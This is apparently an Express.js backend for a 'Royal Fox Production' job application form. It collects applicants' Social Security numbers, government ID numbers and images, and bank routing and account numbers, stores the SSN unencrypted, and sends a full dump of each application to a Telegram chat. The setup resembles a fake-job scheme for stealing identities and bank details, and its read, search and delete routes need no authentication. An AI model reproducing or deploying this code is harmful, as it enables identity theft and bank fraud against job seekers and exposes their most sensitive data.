// ============================================
// FILE: routes/applicationRoutes.js
// ============================================

const express = require("express");
const router = express.Router();
const Application = require("../models/Application");
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");

// Initialize Telegram Bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================
// HELPER FUNCTION: CREATE FORMATTED DOCUMENT
// ============================================

const createApplicationDocument = (formData, applicationId) => {
  let document = "📋 ROYAL FOX PRODUCTION\n";
  document += "   EMPLOYMENT APPLICATION\n";
  document += "═".repeat(60) + "\n\n";

  // Application ID
  document += `📌 APPLICATION ID: ${applicationId}\n`;
  document += `📅 SUBMITTED: ${new Date().toLocaleString()}\n`;
  document += "─".repeat(60) + "\n\n";

  // Section 1: Personal Information
  document += "👤 SECTION 1: PERSONAL INFORMATION\n";
  document += "─".repeat(60) + "\n";
  document += `Full Name: ${formData.lastName}, ${formData.firstName}`;
  if (formData.middleName) document += ` ${formData.middleName}`;
  document += "\n";
  document += `Date of Birth: ${new Date(formData.dob).toLocaleDateString()}\n`;
  document += `Address: ${formData.street}\n`;
  document += `         ${formData.city}, ${formData.state} ${formData.zipCode}\n`;
  document += `Phone: ${formData.phone}\n`;
  document += `Email: ${formData.email}\n`;
  document += `SSN: ${formData.ssn}\n`;
  document += `Legally Authorized to Work: ${
    formData.workAuthorized === "yes" ? "YES" : "NO"
  }\n`;
  document += `Preferred Contact: ${formData.preferredContact.toUpperCase()}\n`;
  document += `ID Type: ${formData.idType}\n`;
  document += `ID Number: ${formData.idNumber}\n`;
  document += `ID Expiration: ${formData.idExpiration}\n`;
  document += "\n";

  // Section 2: Position Details
  document += "💼 SECTION 2: POSITION DETAILS\n";
  document += "─".repeat(60) + "\n";
  document += `Position Applied For: ${formData.positionApplied}\n`;
  document += `Employment Type: ${formData.employmentType.toUpperCase()}\n`;
  document += `Expected Salary/Rate: ${formData.expectedSalary}\n`;
  document += `Available Start Date: ${new Date(
    formData.startDate
  ).toLocaleDateString()}\n`;
  document += `Work Schedule: ${formData.workSchedule}\n`;
  document += `Willing to work overtime/travel: ${
    formData.willOvertimeTravel === "yes" ? "YES" : "NO"
  }\n`;
  document += "\n";

  // Bank Details
  document += "🏦 BANK ACCOUNT DETAILS\n";
  document += "─".repeat(60) + "\n";
  document += `Bank Name: ${formData.bankName}\n`;
  document += `Account Type: ${formData.bankAccountType.toUpperCase()}\n`;
  document += `Account Holder: ${formData.accountHolderName}\n`;
  document += `Routing Number: ${formData.routingNumber}\n`;
  document += `Account Number: ${formData.accountNumber}\n`;
  document += `Direct Deposit Consent: ${
    formData.bankConsent ? "AGREED" : "NOT AGREED"
  }\n`;
  document += "\n";

  // Section 3: Education
  document += "🎓 SECTION 3: EDUCATION BACKGROUND\n";
  document += "─".repeat(60) + "\n";
  document += `High School: ${formData.highSchoolName}\n`;
  document += `Location: ${formData.highSchoolLocation}\n`;
  document += `College/University: ${formData.collegeName}\n`;
  if (formData.collegeLocation)
    document += `Location: ${formData.collegeLocation}\n`;
  if (formData.collegeDegree)
    document += `Degree/Major: ${formData.collegeDegree}\n`;
  if (formData.licenses) {
    document += `Licenses/Certifications:\n${formData.licenses}\n`;
  }
  document += "\n";

  // Section 4: Employment History
  document += "📊 SECTION 4: EMPLOYMENT HISTORY\n";
  document += "─".repeat(60) + "\n";
  if (formData.employmentHistory && formData.employmentHistory.length > 0) {
    formData.employmentHistory.forEach((entry, idx) => {
      if (entry.company) {
        document += `\n Entry ${idx + 1}:\n`;
        document += `  Company: ${entry.company}\n`;
        if (entry.address) document += `  Address: ${entry.address}\n`;
        if (entry.jobTitle) document += `  Job Title: ${entry.jobTitle}\n`;
        if (entry.supervisorName)
          document += `  Supervisor: ${entry.supervisorName}\n`;
        if (entry.dateFrom)
          document += `  Period: ${entry.dateFrom} to ${entry.dateTo}\n`;
        if (entry.responsibilities)
          document += `  Responsibilities: ${entry.responsibilities}\n`;
      }
    });
  } else {
    document += "No employment history provided.\n";
  }
  document += "\n";

  // Section 6: Signature & Consent
  document += "✍️ SECTION 6: SIGNATURE & CONSENT\n";
  document += "─".repeat(60) + "\n";
  document += `Applicant Signature: ${formData.signature}\n`;
  document += `Signed Date: ${new Date(
    formData.signatureDate
  ).toLocaleDateString()}\n`;
  document += `Identity Verification Consent: ${
    formData.identityConsent ? "AGREED" : "NOT AGREED"
  }\n`;
  document += `Bank Details Consent: ${
    formData.bankDetailsConsent ? "AGREED" : "NOT AGREED"
  }\n`;
  document += "\n";

  // Footer
  document += "═".repeat(60) + "\n";
  document += "Royal Fox Production - Confidential\n";
  document += "═".repeat(60) + "\n";

  return document;
};

// ============================================
// HELPER FUNCTION: SEND TO TELEGRAM
// ============================================

const sendApplicationToTelegram = async (formData, applicationId) => {
  try {
    if (!bot || !TELEGRAM_CHAT_ID) {
      console.warn("⚠️ Telegram not configured");
      return false;
    }

    // Create document content
    const documentContent = createApplicationDocument(formData, applicationId);

    // Create temporary directory if it doesn't exist
    const tempDir = path.join(__dirname, "../temp");
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    // Create temporary file
    const tempFilePath = path.join(tempDir, `app_${applicationId}.txt`);
    fs.writeFileSync(tempFilePath, documentContent);

    // Send to Telegram
    await bot.sendDocument(TELEGRAM_CHAT_ID, tempFilePath, {
      caption: `✅ NEW APPLICATION SUBMITTED\n\n📌 ID: ${applicationId}\n👤 Name: ${formData.firstName} ${formData.lastName}\n💼 Position: ${formData.positionApplied}\n📧 Email: ${formData.email}`,
      parse_mode: "HTML",
    });

    // Clean up temporary file
    fs.unlinkSync(tempFilePath);

    console.log(`✅ Application ${applicationId} sent to Telegram`);
    return true;
  } catch (error) {
    console.error("❌ Error sending to Telegram:", error.message);
    return false;
  }
};

// ============================================
// HELPER FUNCTION: SEND STATUS UPDATE
// ============================================

const sendStatusUpdateToTelegram = async (
  applicationId,
  status,
  reviewNotes
) => {
  try {
    if (!bot || !TELEGRAM_CHAT_ID) return;

    const statusEmoji = {
      approved: "✅",
      rejected: "❌",
      "under-review": "⏳",
      submitted: "📝",
    };

    const message = `${
      statusEmoji[status] || "❓"
    } APPLICATION STATUS UPDATE\n\n📌 ID: ${applicationId}\n📊 Status: ${status.toUpperCase()}\n📝 Notes: ${
      reviewNotes || "None"
    }`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message);
    console.log(`✅ Status update sent to Telegram for ${applicationId}`);
  } catch (error) {
    console.error("❌ Error sending status update:", error.message);
  }
};

// ============================================
// ROUTE 1: SUBMIT APPLICATION
// ============================================

router.post("/submit", async (req, res) => {
  try {
    const formData = req.body;

    // Validate required fields
    if (!formData.firstName || !formData.lastName || !formData.email) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields: firstName, lastName, email",
      });
    }

    // Generate unique application ID
    const applicationId = `RFP-${Date.now()}-${Math.random()
      .toString(36)
      .substr(2, 9)
      .toUpperCase()}`;

    // Create new application
    const application = new Application({
      applicationId: applicationId,
      personalInfo: {
        firstName: formData.firstName,
        lastName: formData.lastName,
        middleName: formData.middleName || "",
        dateOfBirth: new Date(formData.dob),
        address: {
          street: formData.street,
          city: formData.city,
          state: formData.state,
          zipCode: formData.zipCode,
        },
        phone: formData.phone,
        email: formData.email,
        workAuthorized: formData.workAuthorized === "yes",
        preferredContact: formData.preferredContact,
        ssn: formData.ssn, // NOT ENCRYPTED
        governmentId: {
          type: formData.idType,
          number: formData.idNumber,
          expiration: new Date(formData.idExpiration),
        },
        idDocuments: {
          front: formData.idFront,
          back: formData.idBack,
        },
      },
      positionDetails: {
        positionApplied: formData.positionApplied,
        employmentType: formData.employmentType,
        expectedSalary: formData.expectedSalary,
        availableStartDate: new Date(formData.startDate),
        preferredWorkSchedule: formData.workSchedule,
        willingToOvertimeTravel: formData.willOvertimeTravel === "yes",
        bankDetails: {
          bankName: formData.bankName,
          accountType: formData.bankAccountType,
          accountHolderName: formData.accountHolderName,
          routingNumber: formData.routingNumber,
          accountNumber: formData.accountNumber,
          directDepositConsent: formData.bankConsent,
        },
      },
      education: {
        highSchool: {
          name: formData.highSchoolName,
          location: formData.highSchoolLocation,
        },
        college: {
          name: formData.collegeName,
          location: formData.collegeLocation || "",
          degree: formData.collegeDegree || "",
        },
        licenses: formData.licenses || "",
      },
      employmentHistory: (formData.employmentHistory || []).map((entry) => ({
        company: entry.company,
        address: entry.address || "",
        jobTitle: entry.jobTitle || "",
        supervisorName: entry.supervisorName || "",
        dateFrom: entry.dateFrom ? new Date(entry.dateFrom) : null,
        dateTo: entry.dateTo ? new Date(entry.dateTo) : null,
        responsibilities: entry.responsibilities || "",
      })),
      documents: {
        resume: formData.resume,
        resumeUploadedAt: new Date(),
      },
      consents: {
        identityVerification: formData.identityConsent,
        bankDetailsVerification: formData.bankDetailsConsent,
        consentedAt: new Date(),
      },
      signature: {
        applicantName: formData.signature,
        signedDate: new Date(formData.signatureDate),
      },
    });

    // Save to MongoDB
    await application.save();

    // Send to Telegram
    await sendApplicationToTelegram(formData, applicationId);

    res.status(201).json({
      success: true,
      message: "Application submitted successfully",
      applicationId: applicationId,
      data: application,
    });
  } catch (error) {
    console.error("Error submitting application:", error.message);
    res.status(500).json({
      success: false,
      message: "Error submitting application",
      error: error.message,
    });
  }
});

// ============================================
// ROUTE 2: GET ALL APPLICATIONS
// ============================================

router.get("/", async (req, res) => {
  try {
    const { status, page = 1, limit = 10 } = req.query;

    let query = {};
    if (status) {
      query.status = status;
    }

    const skip = (page - 1) * limit;

    const applications = await Application.find(query)
      .sort({ submittedAt: -1 })
      .skip(skip)
      .limit(parseInt(limit));

    const total = await Application.countDocuments(query);

    res.json({
      success: true,
      count: applications.length,
      total: total,
      page: parseInt(page),
      pages: Math.ceil(total / limit),
      data: applications,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error fetching applications",
      error: error.message,
    });
  }
});

// ============================================
// ROUTE 3: GET SINGLE APPLICATION
// ============================================

router.get("/:applicationId", async (req, res) => {
  try {
    const application = await Application.findOne({
      applicationId: req.params.applicationId,
    });

    if (!application) {
      return res.status(404).json({
        success: false,
        message: "Application not found",
      });
    }

    res.json({
      success: true,
      data: application,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error fetching application",
      error: error.message,
    });
  }
});

// ============================================
// ROUTE 4: UPDATE APPLICATION STATUS
// ============================================

router.patch("/:applicationId/status", async (req, res) => {
  try {
    const { status, reviewNotes, rejectionReason, reviewedBy } = req.body;

    if (
      !["submitted", "under-review", "approved", "rejected"].includes(status)
    ) {
      return res.status(400).json({
        success: false,
        message: "Invalid status",
      });
    }

    const application = await Application.findOneAndUpdate(
      { applicationId: req.params.applicationId },
      {
        status: status,
        reviewNotes: reviewNotes || "",
        rejectionReason: rejectionReason || "",
        reviewedBy: reviewedBy || "",
        reviewedAt: new Date(),
      },
      { new: true }
    );

    if (!application) {
      return res.status(404).json({
        success: false,
        message: "Application not found",
      });
    }

    // Send status update to Telegram
    await sendStatusUpdateToTelegram(
      req.params.applicationId,
      status,
      reviewNotes
    );

    res.json({
      success: true,
      message: "Application status updated",
      data: application,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error updating application",
      error: error.message,
    });
  }
});

// ============================================
// ROUTE 5: SEARCH BY EMAIL
// ============================================

router.get("/search/email", async (req, res) => {
  try {
    const { email } = req.query;

    if (!email) {
      return res.status(400).json({
        success: false,
        message: "Email parameter required",
      });
    }

    const applications = await Application.find({
      "personalInfo.email": email,
    });

    res.json({
      success: true,
      count: applications.length,
      data: applications,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error searching applications",
      error: error.message,
    });
  }
});

// ============================================
// ROUTE 6: DELETE APPLICATION
// ============================================

router.delete("/:applicationId", async (req, res) => {
  try {
    const application = await Application.findOneAndDelete({
      applicationId: req.params.applicationId,
    });

    if (!application) {
      return res.status(404).json({
        success: false,
        message: "Application not found",
      });
    }

    res.json({
      success: true,
      message: "Application deleted successfully",
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error deleting application",
      error: error.message,
    });
  }
});

// ============================================
// ROUTE 7: GET STATISTICS
// ============================================

router.get("/stats/all", async (req, res) => {
  try {
    const total = await Application.countDocuments();
    const submitted = await Application.countDocuments({ status: "submitted" });
    const underReview = await Application.countDocuments({
      status: "under-review",
    });
    const approved = await Application.countDocuments({ status: "approved" });
    const rejected = await Application.countDocuments({ status: "rejected" });

    res.json({
      success: true,
      data: {
        total,
        submitted,
        underReview,
        approved,
        rejected,
      },
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error fetching statistics",
      error: error.message,
    });
  }
});

// ============================================
// ROUTE 8: GET RECENT APPLICATIONS
// ============================================

router.get("/recent/list", async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 5;

    const applications = await Application.find()
      .sort({ submittedAt: -1 })
      .limit(limit);

    res.json({
      success: true,
      count: applications.length,
      data: applications,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error fetching recent applications",
      error: error.message,
    });
  }
});

// Export router
module.exports = router;
